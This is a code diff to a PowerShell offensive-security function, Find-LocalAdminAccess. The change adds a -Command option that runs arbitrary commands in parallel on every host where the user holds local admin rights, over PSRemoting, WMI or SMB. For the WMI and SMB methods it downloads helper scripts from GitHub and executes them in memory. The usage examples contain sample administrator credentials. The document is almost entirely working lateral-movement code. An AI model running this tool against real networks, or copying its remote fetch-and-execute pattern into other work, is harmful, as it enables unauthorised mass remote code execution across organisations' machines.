@@ -20,6 +20,9 @@ function Find-LocalAdminAccess {
 	
 	.PARAMETER Password
 	Password for the UserName (Works with WMI and PSRemoting only)
+
+ 	.PARAMETER Command
+	Command to execute on targets where we are admin (Works for all methods if Credentials are not provided, otherwise WMI and PSRemoting only)
 	
 	.PARAMETER ShowErrors
 	Show Errors
@@ -29,10 +32,13 @@ function Find-LocalAdminAccess {
 	
 	.EXAMPLE
 	Find-LocalAdminAccess -Method SMB
-	Find-LocalAdminAccess -Method WMI
+ 	Find-LocalAdminAccess -Method SMB -Command "whoami /all"
+  	Find-LocalAdminAccess -Method WMI
+	Find-LocalAdminAccess -Method WMI -Command "whoami /all"
 	Find-LocalAdminAccess -Method PSRemoting
- 	Find-LocalAdminAccess -Method WMI -UserName "ferrari\Administrator" -Password "P@ssw0rd!"
-	Find-LocalAdminAccess -Method PSRemoting -UserName "ferrari\Administrator" -Password "P@ssw0rd!"
+ 	Find-LocalAdminAccess -Method PSRemoting -Command "whoami /all"
+ 	Find-LocalAdminAccess -Method WMI -UserName "ferrari\Administrator" -Password "P@ssw0rd!" -Command "whoami /all"
+	Find-LocalAdminAccess -Method PSRemoting -UserName "ferrari\Administrator" -Password "P@ssw0rd!" -Command "whoami /all"
 	
 	#>
 	
@@ -42,6 +48,7 @@ function Find-LocalAdminAccess {
         	[string]$Method,
         	[string]$UserName,
         	[string]$Password,
+	 	[string]$Command,
 		[switch]$ShowErrors,
   		[switch]$SaveOutput
     	)
@@ -219,5 +226,103 @@ function Find-LocalAdminAccess {
 	        	Write-Output "[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
 			Write-Host ""
 	    	}
+	} else {Write-Output ""}
+
+ 	if ($Command) {
+		
+		Write-Output "[+] Executing Command on Targets.."
+		Write-Output ""
+		
+		$ComputerAccess = $ComputerAccess | Sort-Object
+
+		if ($UserName -and $Password) {
+			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
+			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
+		}
+
+		# Load the scripts into variables
+		if ($Method -eq 'WMI') {
+			$WmiScript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Invoke-WMIRemoting/main/Invoke-WMIRemoting.ps1')
+		}
+		if ($Method -eq 'SMB') {
+			$SmbScript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Invoke-SMBRemoting/main/Invoke-SMBRemoting.ps1')
+		}
+
+		# Create and open a runspace pool
+		$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
+		$RunspacePool.Open()
+
+		$scriptBlock = {
+			param($Computer, $Command, $Method, $cred, $Username, $Password, $WmiScript, $SmbScript)
+
+			try {
+				if ($Method -eq 'PSRemoting') {
+					if ($cred) {
+						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer -Credential $cred
+					}
+					else {
+						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer
+					}
+				}
+				elseif ($Method -eq 'WMI') {
+					. ([ScriptBlock]::Create($WmiScript))
+					if ($cred) {
+						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command -Username $Username -Password $Password
+					}
+					else {
+						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command
+					}
+				}
+				elseif ($Method -eq 'SMB') {
+					. ([ScriptBlock]::Create($SmbScript))
+					$output = Enter-SMBSession -ComputerName $Computer -Command $Command
+				}
+
+				return @{
+					ComputerName = $Computer
+					Output       = $output
+				}
+			} catch {
+				return @{
+					ComputerName = $Computer
+					Error        = $_.Exception.Message
+				}
+			}
+		}
+
+		$JobObjects = @()
+
+		foreach ($Computer in $ComputerAccess) {
+			$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
+			$Job.RunspacePool = $RunspacePool
+			$JobObjects += @{
+				PowerShell = $Job
+				Handle     = $Job.BeginInvoke()
+			}
+		}
+
+		# Wait for all jobs to complete
+		$JobObjects | ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null
+
+		foreach ($Job in $JobObjects) {
+			$Result = $Job.PowerShell.EndInvoke($Job.Handle)
+			if(!$NoOutput){
+				if ($Result.Error) {
+					Write-Output "$($Result.ComputerName): Error - $($Result.Error)"
+				} else {
+					Write-Output "[+] $($Result.ComputerName)"
+					Write-Output "$($Result.Output.TrimEnd())"
+					Write-Output ""
+					Write-Output ""
+				}
+			}
+			$Job.PowerShell.Dispose()
+		}
+
+		$RunspacePool.Close()
+		
+		Write-Output ""
+		Write-Output "[+] Command execution completed"
+		Write-Output ""
 	}
 }
